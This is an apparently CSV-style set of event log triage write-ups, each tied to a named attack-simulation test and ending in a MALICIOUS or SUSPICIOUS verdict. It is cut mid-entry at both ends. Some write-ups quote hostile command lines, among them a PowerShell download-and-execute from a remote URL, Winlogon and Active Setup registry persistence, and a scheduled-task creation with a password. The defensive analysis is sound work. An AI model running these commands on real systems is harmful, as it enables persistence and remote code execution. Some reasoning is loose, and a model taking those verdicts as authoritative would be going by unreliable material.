   - There are a series of PowerShell activities related to file copying and script execution. Specifically, a script named `jsestartup.jse` is being copied to startup folders and executed with `cscript.exe`. This is typically suspicious activity because it suggests the installation of a startup script, potentially for persistence.

3. **Sysmon Log Observations**:
   - There are `cscript.exe` processes executing the `jsestartup.jse` script, which was initiated by a PowerShell command. The actions performed by these scripts are unclear, but such behavior is typically consistent with malicious activities aimed at maintaining persistence or executing unwanted scripts at boot.

4. **Edge Update Activities**:
   - Numerous logs show standard Edge Update activities. However, without additional context or suspicious indicators associated specifically with this process (like connections to known malicious domains or unexplained elevated permissions associated with the execution), these updates could be legitimate.

5. **Overall Execution Context**:
   - The activity is concentrated within a very small time window, suggesting potentially automated/controlled behavior rather than manual user actions.

### Assessment and Resolution:
* The use of PowerShell for copying and executing scripts in startup locations is highly suspicious, given it can potentially allow for persistence mechanisms for malicious purposes.
* The change of system time could be part of an attempt to manipulate event logging.

### Resolution: **MALICIOUS**
Based on the analysis of these logs, the activity indicates potential malicious behavior due to the suspicious execution of scripts via PowerShell that modifies startup behavior, along with actions that could aim to maintain persistence through startup scripts. It's crucial to perform a thorough examination of the script and any associated processes/files it interacts with, and to take appropriate incident response actions to isolate the affected host to prevent further potential compromise."
Winlogon Shell Key Persistence - PowerShell,"After analyzing the provided Windows event logs from various channels such as Application, Security, System, Sysmon, and Windows PowerShell, here are the findings:

### Indicators of Suspicious/Malicious Activity:

1. **PowerShell Command Execution**:
   - There is a PowerShell command being executed with the following command line: `powershell.exe & {Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Shell"" ""explorer.exe, C:\Windows\System32\cmd.exe"" -Force}`.
   - This command alters the registry key related to Winlogon Shell, which might lead to executing additional processes like `cmd.exe` during user logon. This is a known technique used for persistence or executing unwanted commands without user interaction.

2. **Process Creation with High Integrity Level**:
   - Several processes such as `wevtutil.exe` and `conhost.exe` are repeatedly executed by the user `SERVER002\admin_test`. Frequent execution of `wevtutil.exe` and `conhost.exe` processes could be part of administrative tasks but could also indicate scripted actions, potentially part of malware activity especially if seen in conjunction with suspicious PowerShell activity.
   - The processes are executed with a high integrity level, indicating they could perform actions with elevated privileges.

3. **Authenticated User Running System Processes**:
   - Processes like `HOSTNAME.EXE` and `whoami.exe` are executed by the same user account with high integrity, which might not be typical and could indicate privilege exploration or lateral movement.

4. **Modification and Execution of Shell through Winlogon**:
   - Modifying the Shell in the Winlogon registry key to execute `cmd.exe` alongside `explorer.exe` can redirect normal shell operations or add unauthorized command execution during user logon.

### Assessment:
The combination of modifying critical registry keys, frequent execution of administrative/system utilities, and high-integrity process executions are red flags suggesting potential misuse or compromise. Especially the PowerShell activity indicates an attempt to gain persistence or manipulate user environment settings.

### Final Assessment:
- **Resolution: MALICIOUS**

### Guidance:
- **Immediate Actions**:
  - Investigate the user account `SERVER002\admin_test` for any unauthorized access.
  - Inspect the system for any additional suspicious changes or unauthorized software/tools.
  - Review recent changes to critical system configurations and perform a scan for known vulnerabilities or threats.

  - Implement strict monitoring and alerting when changes to critical registry keys are made, especially Winlogon-related keys.
  - Restrict the use of powerful scripting tools like PowerShell for standard users without explicit justification and monitoring.
  - Conduct a comprehensive log audit to ensure no other malicious activities have been performed.

These activities should be investigated further to determine the full scope and impact on the system."
LockBit Black - Modify Group policy settings -cmd,"Upon reviewing the provided Windows event logs from the Windows host, I performed an analysis for any suspicious or anomalous behavior that could indicate malicious activity or compromise.

### Analysis:

**Windows System and Security Logs:**

- **Time Changes:** There are legitimate security events (EventID: 4616) indicating changes in system time, performed by a process (`svchost.exe`). The changes logged here reflect standard operations conducted by the Windows Time Service to synchronize the system clock, and `svchost.exe` is a normal system process running under the `LOCAL SERVICE` account. These entries alone do not indicate malicious activity.

**Sysmon Logs:**

- **Usage of `wevtutil.exe` and `conhost.exe`:** Regular uses of `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe` are noted under the user `SERVER002\admin_test`. The `wevtutil.exe` tool is used for exporting, archiving, and clearing event logs, and its usage in environments might be indicative of an administrative script or task. Similarly, `conhost.exe` is a legitimate Windows process that hosts a console window.

- **Process Activity:**
  - **Execution of `cmd.exe` and `reg.exe`:** The Sysmon logs indicate several executions of `cmd.exe` running commands to modify registry settings related to group policy refresh times and disabling SmartScreen settings. While registry modifications may be part of standard administrative tasks or scripts, disabling SmartScreen could suggest bypassing security features, which could be seen as suspicious if not part of standard operations or approved changes.
  
  - **Microsoft Edge Update Activity:** There are multiple logs capturing the execution of `MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateSetup_X86`, and related components, which are part of the Microsoft Edge browser update operations. This activity is consistent with the automatic update checks and updates performed by the Edge browser.

**Application Logs:**

- **Edge Update Service Stops:** Logged entries for Edge update service stopped messages simply show that the Edge update operations were completed, as corroborated by the Sysmon logs showing multiple executions of Edge update processes.

### Assessment and Resolution:

1. **Registry Changes:**
   - The repetitive registry modifications concerning group policy update times and deactivation of SmartScreen suggest an attempt to alter system configurations, potentially affecting system security. These changes should be verified for legitimacy with system administrators or through change management records.

2. **Edge Updates:**
   - The logs related to Microsoft Edge update activities appear normal and are within expected behavior for background system software updates.

**Resolution:** **SUSPICIOUS**

The activity related to registry modifications, specifically those that disable security features like SmartScreen, can be considered suspicious. Further investigation is needed to verify if these changes were authorized as part of administrative tasks or if they represent unauthorized attempts to weaken system defenses. It is recommended to:

- Review change management or recent administrative tasks to see if such actions were planned.
- Conduct a security awareness session on the risks of unauthorized registry modifications.
- Ensure security features, like SmartScreen, are not disabled without valid business justifications.
- Monitor similar activities for any other unauthorized behavior indicating potential compromise."
Domain Password Policy Check: Short Password,"### Analysis:

**PowerShell Log Analysis:**

The PowerShell logs indicate the execution of a script intended for changing user account passwords. Key observations include:
- The script checks for an existing password file (`$env:LOCALAPPDATA\file\$env:USERNAME.txt`), which contains stored credentials.
- The password change operation is attempted with a hardcoded value, ""Uplow-1"".
- There's logic in place to verify if the new password is different from the stored password. If not, it informs the user and exits.
- If the stored password is incorrect (detected via an error code check), the script commands to remove the existing credential file.
  
This activity can be seen as suspicious because:
- Hardcoding passwords in scripts is a security risk as it might expose passwords.
- The PowerShell script indicates a potential credential management or automated password reset strategy, which could easily be abused by unauthorized users if they have access to modify the script or execute it.

**Sysmon Log Analysis:**

Sysmon logs highlight the execution of system processes from the `SERVER002\admin_test` account, with processes like:
- `wevtutil.exe`: This is a legitimate utility used to retrieve events from event logs. Its frequent use can indicate log investigation or tampering.
- `conhost.exe`, `hostname.exe`, `whoami.exe`: Common console utilities without any obvious malicious use in these logs.
- A PowerShell process with high integrity level, indicating possibly elevated permissions.

**Anomalous Behavior:**
- The PowerShell script execution suggests potential tampering or unauthorized changes with automated scripts concerning user credentials.
- The use of `wevtutil.exe` can signal active engagement in event log management; this is commonly part of incident response or cover-up actions by attackers.
  
### Assessment:

- The activities in the PowerShell logs involving hardcoded credentials and automated scripts changing passwords can be part of a legitimate administration task, but the potential for misuse makes this noteworthy for further scrutiny.
- The frequent appearance of `wevtutil.exe` suggests the possibility of log reviewing or manipulation, which can sometimes be a red flag.

### Conclusion:

Given the analysis, while there is no direct evidence of malicious activity (e.g., compromise, data exfiltration), the behavior is unexpected for typical user operations due to the risks around password management and potential event log manipulation. 

**Resolution: SUSPICIOUS**

### Recommended Actions:

1. **Investigate PowerShell Script:**
   - Examine who created and executed these scripts and for what purpose.
   - Validate if such password management processes are approved and secure against abuse.

2. **Check`wevtutil` Usage:**
   - Validate if this user has legitimate reasons to access and manage event logs.
   - Review access controls and logs to identify any unauthorized access or modification attempts.
  
3. **Audit Security Policies:**
   - Ensure secure handling of credentials and reassess methods used for system administration that involve automated scripts with sensitive data.

4. **Monitor User Activity:**
   - Increase the monitoring of the `SERVER002\admin_test` account.
   - Validate if there's any usage pattern deviation, indicating compromised credentials."
Allowing custom application to execute during new RDP logon session,"After analyzing the provided Windows event logs, we can make the following observations:

1. **Suspicious Command Execution:**

   - There are entries in the Sysmon logs showing the execution of `cmd.exe` with the command line: `""cmd.exe"" /c reg add ""HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd"" /v StartupPrograms /t REG_SZ /d ""calc""`.
   - This command modifies the Windows Registry to add a startup program named ""calc"". While ""calc"" refers to the Windows Calculator, the act of modifying startup programs is commonly associated with persistence mechanisms used by malware.

2. **PowerShell Activities:**

   - PowerShell executions with commands involving ""Get-Item"" and ""Get-Content"" operations on Windows `.inf` files are noted. This type of activity could be benign, relating to system configuration checks or inventory tasks, but it needs further scrutiny due to the potential for script-based attacks using PowerShell.

3. **Repeated Use of System Tools:**

   - The logs show repetitive use of system utilities such as `wevtutil.exe`, `cmd.exe`, `SVCHOST.EXE`, `taskhostw.exe`, and `CompatTelRunner.exe`. While these tools are legitimate, their use in combination with some of the command lines noted could suggest attempts to cover tracks or gather system information clandestinely.

4. **Privilege Events:**

   - Event IDs 4672 (which involves privilege assignment) list several high-level privileges like `SeDebugPrivilege`, `SeAuditPrivilege`, which could indicate an attempt to run processes with elevated privileges.

5. **System and Application Behavior:**

   - Most activities such as Windows Update checks and other patched system executions (e.g., `WMI Provider Host`) parallel typical system processes.

In conclusion, several events in the logs, especially the `cmd` execution modifying the registry and PowerShell usage, warrant further investigation. These activities can be indicative of attempts to establish persistence or execute unauthorized system modifications.

**Resolution: SUSPICIOUS**

Recommendations for further action:
- Conduct a thorough investigation of the command line activities logged by Sysmon.
- Perform threat hunting for persistence mechanisms on the host, especially registry startup keys.
- Review PowerShell logs in greater detail to identify any malicious scripting activity.
- Assess system integrity by comparing running processes and services against known baselines.
- Implement additional monitoring on the identified host to detect any further suspicious activity."
WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique,"Based on the provided logs, I have performed a detailed analysis to identify any indicators of suspicious or malicious activities. Here's the breakdown:

### Analysis of Logs:

1. **System and Security Logs:**
   - The key event from these logs relates to a Windows Time Service (W32Time) event, where the system time was changed. This is generally benign activity when it involves synchronization with reliable time sources such as `time.windows.com`. In this case, there are multiple events associated with system time changes, triggered by the svchost.exe process.
   - There is no direct indication of any time-based attacks, such as those involving false time servers.
   - The usage of `svchost.exe` in the process of time adjustment is typical, and the `LOCAL SERVICE` user context is a standard account for such tasks.

2. **Application Logs:**
   - The application logs contain activity related to the Windows Security Center and Software Protection Platform. The status messages from security products like Windows Defender being active do not suggest any immediate or alarming threats here.

3. **PowerShell Logs:**
   - These logs reveal usage of `Invoke-Expression` (iex) to download a script from a remote location using PowerShell. Specifically:
     - `powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')}`
   - This behavior is highly suspicious as it reflects a potential malicious activity pattern, often observed in malware or unauthorized scripts executing downloaded code from an external source.

4. **Sysmon Logs:**
   - The Sysmon logs contain routine logging of processes such as `hostname.exe`, `conhost.exe`, `whoami.exe`, and `svchost.exe`. 
   - What stands out is the repeated pattern of PowerShell execution with high integrity level, potentially posing a risk if combined with suspicious script execution found in the PowerShell logs.
   - The presence of various system utility executions (`whoami.exe`, `wevtutil.exe`) seems primarily benign if these actions are typical for administrative maintenance on this server. However, without specific authorized activity logs, it cannot be completely ruled out as suspicious.

### Assessment:

- **Suspicious Indicators:**
  - The PowerShell session downloading and executing a script from an external source is the most compelling evidence of potential malicious activity. This type of execution is commonly associated with scripted attacks or unauthorized changes being made to a system.

### Resolution:

- **SUSPICIOUS:**
  - The activity identified within the PowerShell logs warrants further investigation due to its potential to execute unauthorized or harmful scripts. While the other logs' activities can be reasonably considered benign, the PowerShell command-line evidence suggests possible compromise attempts that need to be addressed.

### Guidance on How to Proceed:

1. **Immediate Steps:**
   - Isolate the system to prevent any potential spread of malicious activity.
   - Review and restrict internet access to unknown or untrusted domains.
   - Validate the authenticity of the script being downloaded, and check for hashes or indicators of compromise against known threat intelligence databases.

2. **Further Investigation:**
   - Conduct a broader sweep for additional PowerShell or related network activity.
   - Review user activity especially around PowerShell to confirm if this was an unintended benign code execution.
   - Reassess the policies that permit such unrestricted PowerShell access and potentially apply more restrictive execution policies.

3. **Long-term Measures:**
   - Regularly educate users on safe script executions and recognizing phishing or other social engineering tactics.
   - Implement and enforce strict network monitoring and segmentation to catch any similar suspicious activities early.

This action will ensure that the potentially malicious activities identified are thoroughly investigated and mitigated.

"
HKLM - Add atomic_test key to launch executable as part of user setup,"### Analysis of Windows Event Logs

#### PowerShell Logs

The PowerShell logs reveal a sequence of commands executed through the PowerShell console. The commands involve the creation and modification of registry keys related to Active Setup, with the specific command execution being:

- **Command**: 
  - `New-Item ""HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components"" -Name ""file_test"" -Force`
  - `Set-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\file_test"" ""(Default)"" ""ART TEST"" -Force`
  - `Set-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\file_test"" ""StubPath"" ""C:\Windows\System32\calc.exe"" -Force`
  - Execute `runonce.exe /AlternateShellStartup`

- **Analysis**:
  - **Registry Modification**: Modifying the Active Setup registry keys, especially with a `StubPath` pointing to `calc.exe`, is an unusual practice. While `calc.exe` is a benign application, using it in this context can potentially indicate testing or a demonstration of persistence techniques rather than a practical payload delivery.
  - **Execution of RunOnce**: Using the RunOnce key to execute commands at startup is a known persistence mechanism in malware. However, in this case, it's used to execute `calc.exe`, a default Windows calculator. This action suggests non-malicious intent unless it serves as a proof of concept.

#### Sysmon Logs

The Sysmon logs document various process creations and terminations:
- **Notable Executions**:
  - High frequency of `wevtutil.exe` and `conhost.exe` execution by the user `SERVER002\admin_test`.
  - Execution of `hostname.exe`, `whoami.exe`, `calc.exe`, and system-level executions under the authority of `NT AUTHORITY\SYSTEM`.

- **Analysis**:
  - **Process Executions**: Frequent use of system utilities such as `wevtutil.exe` and `hostname.exe` is somewhat suspicious if these events did not arise from known administrative scripts or tasks.
  - **Microsoft Edge Update**: Numerous instances of `MicrosoftEdgeUpdate.exe` are running, which aligns with regular maintenance or auto-updating behavior for Microsoft Edge.

#### Security and System Logs

- Logs indicate normal operations and time adjustments through `svchost.exe`, indicating routine time synchronization and service operations.

#### Application Logs

- `edgeupdate` service shows two stop events corresponding with typical application lifecycle activities, suggesting regular behavior.

### Conclusion

Upon reviewing all logs:

- **Suspicious Activity**: The use of Active Setup registry manipulation to persistently execute applications like `calc.exe`—while not immediately harmful—can be a sign of malicious activities or security testing (proof of concept), and is typically associated with persistence techniques used by malware.

- **Regular System Updates**: The presence of multiple `MicrosoftEdgeUpdate.exe` processes suggests routine update checks and executions, aligned with regular system operations and not suggestive of direct malicious intent.

### Resolution

The findings are **SUSPICIOUS**. The activities around the Active Setup modification warrant further investigation to rule out any potential for warranty or explanation of the actions' origins, specifically looking into:
- The context of why the registry modifications were made.
- Verifying if these actions align with any sanctioned security practices or software testing procedures.

Further steps would be to:
- Conduct a deeper forensic analysis on the system to ensure no other persistence or execution mechanisms are present.
- Verify with the relevant IT or system administrator if the actions logged are part of routine checks, updates, or tests."
Read-Write-Execute process Injection,"Based on the provided Windows event logs, here’s a detailed analysis:

### Summary of Notable Events:
1. **Sysmon Log Analysis:**
   - Multiple processes executed by an account named `admin_test` on `SERVER002`, including PowerShell, conhost.exe, wevtutil.exe, HOSTNAME.EXE, whoami.exe, and MicrosoftEdgeUpdate.exe.
   - A notable PowerShell execution with complex and obfuscated command line parameters, involving operations on paths within temporary directories and using executables like `searchVuln.exe` and `RWXinjectionLocal.exe`.
   - `wevtutil.exe` is a legitimate utility but could be used to manage event logs, potentially covering tracks.
   - Use of `whoami.exe` to query the current logged on user and `hostname.exe` are standard and benign out of context, but used in conjunction with other events, can indicate reconnaissance.

2. **PowerShell Log Analysis:**
   - The PowerShell logs show execution of a complex script. The script involves:
     - A search for specific memory addresses in a DLL and subsequent code execution.
     - The use of the `RWXinjectionLocal.exe`, likely suggesting an attempt at performing code injection, which can be highly suspicious or malicious.

### Indicators of Malicious Activity:
- **PowerShell Obfuscation and Scripting:** The use of obfuscated, complex PowerShell commands and executables in temporary directories hint at potential exploitation or post-exploitation activities.
- **DLL Injection:** The mention of `RWXinjectionLocal.exe` and actions targeting a DLL indicate an advanced technique often associated with malicious actors trying to execute arbitrary code.

### Threat Assessment:
The combination of these events indicates a potential compromise:
- The PowerShell activity represents potential exploitation, privilege escalation, or lateral movement within the network.
- Frequent invocation of command-line tools and the aforementioned PowerShell script suggest active abuse, possibly by a malicious actor who gained initial access.

### Final Assessment: **MALICIOUS**
Given the indicators, complexity, and intent observed, these logs contain evidence of malicious activity. These logs are not benign due to the probable execution of malicious scripts aimed at exploiting vulnerabilities or maintaining persistence. 

### Guidance on How to Proceed:
1. **Immediate Isolation:** Consider isolating the affected system (SERVER002) from the network to prevent further spread or activity.
2. **Thorough Investigation:** Conduct a thorough forensic analysis of the system, particularly focusing on:
   - The specific files executed by PowerShell.
   - Any unknown or suspicious binaries on the system.
   - Logs correlating with other systems to identify potential lateral movement.
3. **Patch and Update:** Check for patches related to known vulnerabilities associating with the detected activities and ensure all software is updated.
4. **Strengthen Security Posture:** Review and strengthen authentication and access mechanisms, and improve logging and monitoring to detect such activities earlier in the future.
5. **Notify and Engage:** Notify the relevant internal and possibly external (e.g., cybersecurity firm) stakeholders and engage in further incident response protocol steps.

By taking these actions, the organization can mitigate the impact and prevent potential further compromise."
Scheduled task Remote,"**Analysis:**

1. **Time Manipulation:**

   - The System and Security logs indicate changes in system time. There are multiple instances of Event ID 1 from ""Microsoft-Windows-Kernel-General"" and Event ID 4616 from ""Microsoft-Windows-Security-Auditing"". These entries record changes in the system time from 16:42:19 to 16:42:09, and then adjustments within milliseconds.
   - The changing of system time can be innocent, such as manual adjustments or time synchronization activities, especially with the Time Service selecting `time.windows.com` as the source. However, time alteration can also be used by attackers to confuse timestamps and logs.

2. **Process Executions:**

   - The execution of `wevtutil.exe` and `cmd.exe` is logged, which in itself isn't immediately suspicious, but what stands out is the use of `schtasks.exe` to create a scheduled task with `cmd.exe`.
   - The command line for `cmd.exe` is `""cmd.exe"" /c SCHTASKS /Create /S localhost /RU DOMAIN\\user /RP At0micStrong /TN ""file task"" /TR ""C:\\windows\\system32\\cmd.exe"" /SC daily /ST 20:10`. This task creation attempts to run `cmd.exe` daily, which could indicate persistence methods typical of malicious activity if not created by a legitimate user action.

3. **Unverified High Integrity Level Processes:**

   - The logs show executions of `wevtutil.exe`, `conhost.exe`, and `whoami.exe` under the `SERVER002\admin_test` user with a High integrity level.
   - Hostname and whoami processes are generally benign unless used in a sequence of actions for reconnaissance or elevation of privileges.

4. **Scheduled Task Creation:**

   - Creating scheduled tasks using `schtasks.exe` as indicated is suspicious unless explicitly acknowledged by the system admin or other authorized user. The use of ""At0micStrong"" as a password may suggest scripted or non-standardized task creation, usually a red flag for potential malicious scripting.

**Conclusion and Recommendation:**

- **Suspicious Findings:** The primary suspicious activity in these logs is the creation of a scheduled task meant to execute `cmd.exe` regularly. Scheduled tasks are often used in persistence mechanisms by malware. The manipulation of system time and the execution context, although not convincingly malicious on their own, can be suspicious if associated with unauthorized scheduled tasks.
  
- **Resolution:** **SUSPICIOUS** - There are suspicious activities that warrant further investigation to confirm their legitimacy. It's essential to verify with the relevant admin or user if they authorized these changes or task creations. Review any additional system logs, audit the system's current scheduled tasks, and if unauthorized, disable or remove the malicious ones. Consider scanning the system for potential malware or unauthorized scripts and evaluate the necessity of heightened monitoring or temporary isolation of the affected machine."
Section View Injection,"**Detailed Analysis of the Windows Event Logs:**

1. **Application Log:**
   - No suspicious activity is evident in the Application logs provided. The logs reference Microsoft-Windows-Security-SPP (Software Protection Platform Service) which seems to be functioning as expected.

2. **Security Log Analysis:**
   - Two `4616` events related to time change occur. The time change reflects a backward adjustment from ""2024-10-22 17:21:10.0546847"" to ""2024-10-22 17:20:41.3798167"". While time changes can sometimes indicate an attempt to manipulate logs, this requires contextual validation with IT practices or misconfigurations in network time services. No unusual time-spanning jump was observed.
   - The `4634` logoff event for the user `admin_test` followed immediately by `4672` privileged logon event indicates that admin_test logged-on gaining special privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, etc. This may not be uncommon for admin users but should be checked against typical usage patterns.
   - The `4624` logon event shows the `admin_test` user logging in via NTLM from IP: 192.168.1.168 which should be verified if it was legitimate access or unusual access from different parts of the network.

3. **System Log Analysis:**
   - Several kernel general (EventID: 1 and 24) log entries are present associated with time updates and timezone adjustments. Time synchronization with `time.windows.com` indicates automatic Windows Time Service actions.
   - No anomalies were observed that explicitly indicate malicious activities in System Logs. 

4. **Sysmon Log Analysis:**
   - There's a repeated execution of `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe`. The use of `wevtutil.exe` can sometimes suggest log manipulation, but without specific context or execution parameters this is insufficient to judge.
   - Of notable concern is an event showing `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` executing a command via Sysmon with this command: `""powershell.exe"" & {$notepad = Start-Process notepad -passthru, Start-Process \""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\bin\x64\InjectView.exe\""}`.
   - `InjectView.exe` appears suspicious without known context for executing this binary from a temporary directory. Often attackers can use temporary directories for launching payloads to evade detection.

5. **Windows PowerShell Log Analysis:**
   - PowerShell logs suggest suspicious execution with commands starting processes `notepad` and `InjectView.exe`. It is particularly notable that PowerShell `Start-Process` is used to execute from a temporary location.

**Assessment:**
- **SUSPICIOUS**: The presence of `InjectView.exe` being executed via PowerShell from a temporary directory, preceded by NTLM logon from a specific IP address and privilege escalation, raises concerns about potentially unauthorized activities. The nature of `InjectView.exe` and corresponding IP address/user behavior must be verified.

**Guidance on How to Proceed:**
1. **Validate `InjectView.exe`:** Investigate the binary `InjectView.exe` for legitimacy. Check its origin, hash, and whether it corresponds to any known malware signature.
2. **Examine Login Details:** Verify if the login activity from IP `192.168.1.168` is recognized and if `admin_test` typically logs in from this machine.
3. **Log Retention & Integrity:** Ensure that the logs have been not manipulated, and consider enabling additional logging if necessary.
4. **Contain and Remediate:** If `InjectView.exe` or PowerShell activity is confirmed malicious, contain the affected host, escalate investigation, and apply remediations.
5. **User Review:** Review activities of `admin_test` user to ensure no further unauthorized access or privilege use is occurring.

Further investigation is advised to confidently determine if compromise has occurred."
EarlyBird APC Queue Injection in Go,"### Analysis of Windows Event Logs

#### **1. Overview:**
The logs provided stem from multiple Windows event log channels: Sysmon, Security, Windows PowerShell, System, and Application. These logs focus on user and system activities, including processes associated with suspicious PowerShell commands, potential time manipulation, and user privilege activities.

#### **2. Suspicious and Anomalous Activities:**
Several activities within the logs stand out during the investigation:

- **PowerShell Activities:**
  - **Event ID: 1 (Sysmon) and Windows PowerShell Logs:** Processes launched by PowerShell are observed with a suspicious command line:
    ```plaintext
    powershell.exe & {C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.004\bin\x64\EarlyBird.exe -program ""C:\Windows\System32\werfault.exe"" -debug}
    ```
  - This command line executes a binary (`EarlyBird.exe`) from a temporary user folder, and attempts to launch it with `werfault.exe`, which usually handles Windows Error Reporting. Execution from temporary directories and chaining with legitimate executables is a known malware technique.

- **Security and Privilege Escalation (Event ID: 4672):**
  - **Privileges Granted:** The user `admin_test` is granted a wide range of privileges including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and `SeLoadDriverPrivilege`. These are powerful privileges that could be used for malicious purposes such as system manipulation or kernel-level code execution.

- **Time Manipulation (Event ID: 4616 in Security and System Logs):**
  - The logs show that system time was adjusted by `svchost.exe`. Time manipulation can be used for evading detection by security tools.

#### **3. Potential Malicious Activities:**
- **EarlyBird.exe Execution:** The execution of a binary from a temporary directory with administrative user privileges and chaining it with a legitimate executable presents a confirmed case of suspicious activity indicative of exploitation or malware behavior.

#### **4. Assessment and Resolution:**

- **Assessment of Situation:**
  - The combination of executing suspicious code through PowerShell from a temporary location, coupled with potentially dangerous privilege requests, and time manipulation strongly suggest malicious intent.
  
- **Threats and Risks Identified:**
  - **Process Execution:** The use of PowerShell for executing suspicious commands that are potentially used to inject or execute malware.
  - **Privilege Escalation:** The elevation of privileges in suspicious contexts, which could allow an attacker to bypass security restrictions.
  - **Time Manipulation:** Adjusting system time may have been performed either intentionally for a specific operational purpose or to aid in compromising activities to elude logs.

- **Resolution:**
  - **MALICIOUS** - The combination of suspicious PowerShell execution, unusual privileges, and time manipulation collectively indicate a strong likelihood of malicious activity.

#### **5. Guidance on How to Proceed:**
- **Immediate Actions:**
  - Isolate the machine (Server002) from the network to prevent further propagation.
  - Conduct a forensic analysis of `EarlyBird.exe` and any related files in the users’ temporary directories.
  - Review system integrity and assess potential impacts on data and security.
- **Long-term Actions:**
  - Ensure logging of PowerShell script executions is enabled and monitored.
  - Harden system time settings to prevent unauthorized changes.
  - Review privilege assignments and employ the principle of least privilege.

These steps should aid in mitigating any active threat and bolstering security measures to guard against future incidents."
Modify HKLM:\System\CurrentControlSet\Control\Lsa Security Support Provider configuration in registry,"### Analysis of the Logs:

#### Suspicious Behavior Identified:

1. **PowerShell Script Execution:**
   - The PowerShell logs contain multiple instances of a script that alters the Windows registry, specifically targeting the `HKLM:\System\CurrentControlSet\Control\Lsa` key to modify the 'Security Packages' value. The script saves the old value, stores it with a new name, and introduces `AtomicTest.dll` as the new value.
   - Such manipulations are not typical user operations and could suggest the execution of a payload or a testing tool to alter authentication mechanisms, which is highly suspicious.

2. **Log Clearing:**
   - Events in the System and Security logs show instances where the logs were cleared by the user `admin_test`. This action is commonly associated with malicious intent, as an attacker may attempt to cover tracks by removing audit logs.

3. **Unexpected Process Creation:**
   - The `wevtutil.exe` utility is used to clear logs, as seen in the Sysmon logs. This utility, combined with the log-clearing events, points towards malicious activity to prevent audit trails.

4. **Unusual Process Behavior:**
   - Multiple `Sysmon` log entries show creations of various processes under `SYSTEM` level integrity, with frequent calls to Edge Update processes, which is usually benign. However, the overall high frequency and correlation with the other suspicious activities warrant further investigation for any potential dropper or privilege escalation attacks.

#### Indicators of Potential Compromise:

- **Registry Key Modification**: Altering registry keys related to security packages and adding unknown DLLs is a strong indication of a potential compromise.
  
- **Use and Clearing of Logs**: The use of `wevtutil.exe` to clear logs right before suspicious activities suggests malicious cleanup acts.

- **Admin User Activity**: The `admin_test` account clearing logs and running high-integrity level processes in rapid sequence could imply credential compromise and misuse.

### Assessment:

Based on the identified suspicious activities, especially the registry manipulation, and log clearing by an administrative user, the analysis concludes that the logs contain a high likelihood of indicating a security breach.

### Resolution:

**MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Incident Response:**
   - Isolate the machine 'Server002' from the network to prevent lateral movement.
   - Preserve all logs and data for further forensic analysis.

2. **Forensic Analysis:**
   - Conduct a thorough forensic examination focusing on the registry changes, PowerShell scripts, and user account activities, especially `admin_test`.

3. **Credential Security:**
   - Perform a password reset for all administrator accounts and review accounts for any unauthorized access.
   
4. **Log Management:**
   - Reinstate logging to monitor any further attempts to tamper with logs.
   - Implement stricter log auditing to detect any similar activities in the future.

5. **Evaluate Security Measures:**
   - Assess and strengthen endpoint protection and monitoring solutions to prevent similar occurrences.
   - Conduct a security awareness program for all users, emphasizing the warning signs of potential attacks."
Remote Process Injection with Go using NtQueueApcThreadEx WinAPI,"Upon reviewing the provided Windows event logs, there are several indications of potentially suspicious activities that warrant further investigation:

### Analysis of Logs:

1. **Suspicious PowerShell Execution**:
   - In the `Sysmon` and `Windows PowerShell` logs, there are entries indicating a PowerShell process executing with a command line referencing `NtQueueApcThreadEx.exe` located in a temporary directory. PowerShell commands executed from temporary directories and with uncommon executables like `NtQueueApcThreadEx.exe` are often suspicious and can potentially indicate malicious activity or exploitation attempts. The presence of a `-debug` flag also suggests it may be used for more advanced operations or debugging attempts in malware.

2. **Privileged Process Activities**:
   - Events `4672` show privileges (e.g., `SeDebugPrivilege`, `SeImpersonatePrivilege`) being assigned to the SYSTEM account. While this is typical for system-level processes, in combination with the suspicious PowerShell activity, this might suggest a threat exploiting high privileges.
   
3. **Unusual Process Actions**:
   - Multiple instances of `whoami.exe` and `wevtutil.exe` are being run with similar high integrity levels by `admin_test` in quick succession. These could represent steps in an attack chain for reconnaissance or tampering with event logs, respectively.
   
4. **Access Credential Events**:
   - There are multiple `5379` events with return code `3221226021` indicating attempts to access Microsoft account credentials, possibly without success as indicated by the return code, suggesting potential brute-force or credential dumping attempts.

5. **Taskhostw Process Execution**:
   - The `taskhostw.exe` process, which usually acts to start Windows tasks, lists users such as `DefaultAccount`, `Guest`, and `Administrator`. If these accounts are accessed or managed unexpectedly, it could lead to privilege escalation or unauthorized access.

### Conclusion and Guidance:

Given the combination of logging activities, especially the PowerShell execution of an unusual and potentially dangerous executable, repeated privileged access rights assignments, and attempts to access sensitive information (credentials), the logs suggest:
- **Resolution: SUSPICIOUS** - The activity recorded indicates potential precursor or active compromise behaviors. These warrant further immediate investigation.

### Next Steps:

1. **Contain and Investigate**:
   - Isolate the affected system (`Server002`) from the network immediately to prevent potential lateral movement or data exfiltration.
   - Conduct a detailed forensic analysis of the suspicious PowerShell activity, especially focusing on the intent and impact of `NtQueueApcThreadEx.exe`.

2. **Review and Monitor for Further Indicators**:
   - Continuously monitor and analyze other systems for similar PowerShell executions or anomalous activities.
   - Enhance logging on related systems to capture more detailed data about similar events, particularly those affecting process creation or privilege escalation.

3. **Strengthen Security Measures**:
   - Review and possibly restrict PowerShell execution policies and audit relevant administrative accounts and their activities.
   - Ensure that all accounts, especially those with elevated privileges, have strong and unique passwords and are monitored for unusual activities.

Implementing these measures should help in assessing the potential scope of the incident and mitigating further risks from ongoing threats."
Winlogon Userinit Key Persistence - PowerShell,"### Detailed Log Analysis

#### Windows PowerShell Logs
